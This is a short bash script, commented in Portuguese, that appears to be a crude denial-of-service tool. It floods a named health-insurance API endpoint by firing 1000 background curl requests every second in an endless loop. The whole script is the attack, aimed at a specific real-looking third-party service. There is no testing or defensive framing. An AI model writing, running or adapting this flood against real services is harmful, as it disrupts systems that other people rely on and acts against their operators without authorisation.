#!/bin/bash

# URL alvo
URL="https://api.saude.portoseguro.com.br/emissao/v1/summary/526901"

while true; do
    # Envia a requisição GET para a URL em segundo plano
    i=0
    while [ $i -lt 1000 ]; do
        curl -s "$URL" > /dev/null &
        i=$((i + 1))
    done

    # Aguarda um segundo antes de iniciar o próximo loop
    sleep 1
done
